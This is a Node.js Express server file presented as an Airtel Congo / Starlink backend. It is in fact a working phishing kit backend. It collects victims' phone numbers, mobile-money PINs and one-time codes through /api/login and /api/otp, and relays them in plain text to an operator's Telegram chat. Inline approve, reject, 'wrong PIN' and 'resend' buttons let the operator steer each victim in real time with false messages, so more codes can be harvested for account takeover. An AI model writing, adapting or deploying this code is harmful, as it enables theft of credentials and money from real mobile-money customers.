// server.js — Airtel Congo / Starlink backend (Render)

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ---------- Config ----------
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();

let publicUrl = process.env.PUBLIC_URL || '';
if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
  publicUrl = process.env.RENDER_EXTERNAL_URL;
}

// ---------- In-memory sessions ----------
const sessions = new Map();       // login sessions
const otpSessions = new Map();    // OTP sessions
const SESSION_TTL_MS = 15 * 60 * 1000;
const OTP_TTL_MS = 5 * 60 * 1000; // OTP expires after 5 minutes

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions) {
    if (now - s.createdAt > SESSION_TTL_MS) sessions.delete(id);
  }
  for (const [id, o] of otpSessions) {
    if (now - o.createdAt > OTP_TTL_MS && o.status === 'pending') {
      o.status = 'expired';
      o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
    }
    if (now - o.createdAt > SESSION_TTL_MS) otpSessions.delete(id);
  }
}, 30 * 1000);

// ---------- Telegram helpers ----------
async function tgCall(method, payload, retries = 3) {
  if (!BOT_TOKEN) {
    console.warn('⚠️  Telegram token missing');
    return null;
  }
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (!data.ok) {
        console.error(`Telegram ${method} error (attempt ${i + 1}):`, data);
        if (data.error_code === 400 || data.error_code === 401) return data;
      } else {
        return data;
      }
    } catch (err) {
      console.error(`Telegram ${method} failed (attempt ${i + 1}):`, err.message);
      if (err.cause) console.error('  Cause:', err.cause.code, '—', err.cause.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
  return null;
}

async function tgSend(text, reply_markup) {
  if (!CHAT_ID) {
    console.warn('⚠️  Telegram chat id missing');
    return false;
  }
  const payload = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (reply_markup) payload.reply_markup = reply_markup;

  const data = await tgCall('sendMessage', payload);
  if (data && data.ok) {
    console.log('✅ Telegram message sent');
    return true;
  }
  return false;
}

async function tgAnswerCallback(callback_query_id, text) {
  await tgCall('answerCallbackQuery', { callback_query_id, text, show_alert: false });
}

async function tgEditMessage(chat_id, message_id, text, reply_markup) {
  const payload = { chat_id, message_id, text, parse_mode: 'HTML', disable_web_page_preview: true };
  if (reply_markup) payload.reply_markup = reply_markup;
  await tgCall('editMessageText', payload);
}

async function tgSetWebhook() {
  if (!BOT_TOKEN || !publicUrl) {
    console.warn('⚠️  Cannot register webhook — BOT_TOKEN or publicUrl missing');
    return;
  }
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`🔗 Registering webhook: ${webhookUrl}`);
  const data = await tgCall('setWebhook', { url: webhookUrl });
  if (data && data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
  else console.error('❌ Webhook failed:', data);
}

// ---------- Plan block ----------
function planBlock(p) {
  return (
    `📦 Forfait: <b>${p.plan || '-'}</b>\n` +
    (p.amount ? `📊 Volume: <b>${p.amount} ${p.unit || ''}</b>\n` : '') +
    (p.validity ? `⏱ Validité: <b>${p.validity}</b>\n` : '') +
    (p.price ? `💰 Prix: <b>${p.price} FC</b>\n` : '')
  );
}

// ---------- API routes ----------

app.post('/api/login', async (req, res) => {
  const { plan, amount, unit, validity, price, phone, pin } = req.body || {};

  if (!phone || !pin) {
    return res.status(400).json({ ok: false, error: 'Numéro et code requis.' });
  }

  const sessionId = crypto.randomBytes(12).toString('hex');
  sessions.set(sessionId, {
    plan, amount, unit, validity, price, phone, pin,
    status: 'pending',
    createdAt: Date.now(),
    message: ''
  });

  console.log('📥 Login:', { sessionId, phone, plan, price });

  const text =
    `🇨🇩 <b>Nouvelle Connexion — Airtel Congo</b>\n\n` +
    planBlock({ plan, amount, unit, validity, price }) +
    `📱 Téléphone: <b>+243 ${phone}</b>\n` +
    `🔑 Code PIN: <b>${pin}</b>\n\n` +
    `🆔 Session: <code>${sessionId}</code>`;

  const reply_markup = {
    inline_keyboard: [[
      { text: '✅ Approuver', callback_data: `approve:${sessionId}` },
      { text: '❌ Rejeter',  callback_data: `reject:${sessionId}` }
    ]]
  };

  await tgSend(text, reply_markup);
  res.json({ ok: true, sessionId });
});

app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const s = sessions.get(sessionId);

  if (!s || Date.now() - s.createdAt > SESSION_TTL_MS) {
    if (s) sessions.delete(sessionId);
    return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
  }

  res.json({ ok: true, status: s.status, message: s.message || '' });
});

// ---------- OTP submit ----------
app.post('/api/otp', async (req, res) => {
  const { sessionId: loginSessionId, plan, amount, unit, validity, price, phone, otp } = req.body || {};

  if (!otp) {
    return res.status(400).json({ ok: false, error: 'Code OTP requis.' });
  }

  const otpSessionId = crypto.randomBytes(12).toString('hex');
  otpSessions.set(otpSessionId, {
    loginSessionId: loginSessionId || null,
    plan, amount, unit, validity, price, phone, otp,
    status: 'pending',
    message: '',
    createdAt: Date.now()
  });

  console.log('📥 OTP:', { otpSessionId, phone, otp });

  const text =
    `🔢 <b>Code OTP Soumis — Airtel Congo</b>\n\n` +
    planBlock({ plan, amount, unit, validity, price }) +
    `📱 Téléphone: <b>+243 ${phone || '-'}</b>\n` +
    `🔢 OTP: <b>${otp}</b>\n\n` +
    `🆔 OTP Session: <code>${otpSessionId}</code>`;

  const reply_markup = {
    inline_keyboard: [
      [
        { text: '✅ Approuver',     callback_data: `otp-approve:${otpSessionId}` },
        { text: '⚠️ Code PIN erroné', callback_data: `otp-wrongpin:${otpSessionId}` }
      ],
      [
        { text: '❌ Rejeter',  callback_data: `otp-reject:${otpSessionId}` },
        { text: '🔄 Renvoyer', callback_data: `otp-resend:${otpSessionId}` }
      ]
    ]
  };

  await tgSend(text, reply_markup);

  res.json({ ok: true, otpSessionId });
});

// ---------- OTP status (polled by otp.html) ----------
app.get('/api/otp-status/:otpSessionId', (req, res) => {
  const { otpSessionId } = req.params;
  const o = otpSessions.get(otpSessionId);

  if (!o) {
    return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
  }

  if (o.status === 'pending' && Date.now() - o.createdAt > OTP_TTL_MS) {
    o.status = 'expired';
    o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
  }

  res.json({ ok: true, status: o.status, message: o.message || '' });
});

// ---------- Telegram webhook ----------
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body || {};

  if (update.callback_query) {
    const cq = update.callback_query;
    const data = cq.data || '';
    const [action, id] = data.split(':');
    const msg = cq.message;
    const fromId = String(cq.from && cq.from.id);

    console.log('📲 Callback:', { action, id, from: fromId });

    if (fromId !== CHAT_ID) {
      await tgAnswerCallback(cq.id, 'Non autorisé.');
      return res.sendStatus(200);
    }

    // ---- LOGIN approve / reject ----
    if (action === 'approve' || action === 'reject') {
      const s = sessions.get(id);
      if (!s) {
        await tgAnswerCallback(cq.id, 'Session introuvable ou expirée.');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + '\n\n⚠️ <b>Session expirée</b>');
        return res.sendStatus(200);
      }
      if (action === 'approve') {
        s.status = 'approved';
        s.message = 'Approuvé';
        await tgAnswerCallback(cq.id, '✅ Approuvé');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n✅ <b>APPROUVÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
      } else {
        s.status = 'rejected';
        s.message = 'Numéro incorrect. Veuillez vérifier et réessayer.';
        await tgAnswerCallback(cq.id, '❌ Rejeté');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
      }
      return res.sendStatus(200);
    }

    // ---- OTP approve / reject / resend / wrongpin ----
    if (action === 'otp-approve' || action === 'otp-reject' || action === 'otp-resend' || action === 'otp-wrongpin') {
      const o = otpSessions.get(id);
      if (!o) {
        await tgAnswerCallback(cq.id, 'Session OTP introuvable ou expirée.');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + '\n\n⚠️ <b>Session OTP expirée</b>');
        return res.sendStatus(200);
      }

      if (action === 'otp-approve') {
        o.status = 'approved';
        o.message = 'Approuvé';
        await tgAnswerCallback(cq.id, '✅ Approuvé');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n✅ <b>APPROUVÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
      } else if (action === 'otp-reject') {
        o.status = 'rejected';
        o.message = 'Code OTP incorrect. Veuillez réessayer.';
        await tgAnswerCallback(cq.id, '❌ Rejeté');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
      } else if (action === 'otp-wrongpin') {
        o.status = 'wrongpin';
        o.message = 'Code PIN incorrect. Veuillez saisir le bon code PIN.';
        await tgAnswerCallback(cq.id, '⚠️ Code PIN erroné');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n⚠️ <b>CODE PIN ERRONÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
      } else { // otp-resend
        o.status = 'expired';
        o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
        await tgAnswerCallback(cq.id, '🔄 Renvoyé');
        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n🔄 <b>RENVOYÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
      }
      return res.sendStatus(200);
    }

    await tgAnswerCallback(cq.id, 'Action inconnue.');
    return res.sendStatus(200);
  }

  const msg = update.message;
  if (msg && msg.text && String(msg.chat.id) === CHAT_ID) {
    const text = msg.text.trim();
    console.log('📨 Telegram command:', text);

    if (text === '/help' || text === '/start') {
      await tgSend(
        `🤖 <b>Airtel Congo — Admin</b>\n\n` +
        `Utilisez les boutons inline sous chaque message:\n` +
        `• Connexion → ✅ Approuver / ❌ Rejeter\n` +
        `• OTP → ✅ Approuver / ⚠️ Code PIN erroné / ❌ Rejeter / 🔄 Renvoyer`
      );
    }
  } else {
    console.log('📨 Telegram update:', JSON.stringify(update).slice(0, 200));
  }

  res.sendStatus(200);
});

// ---------- Static site ----------
app.use(express.static(path.join(__dirname, '..')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
  console.log(`   BOT_TOKEN set: ${BOT_TOKEN ? 'YES' : 'NO'}`);
  console.log(`   CHAT_ID set:   ${CHAT_ID ? 'YES' : 'NO'}`);
  tgSetWebhook();
});
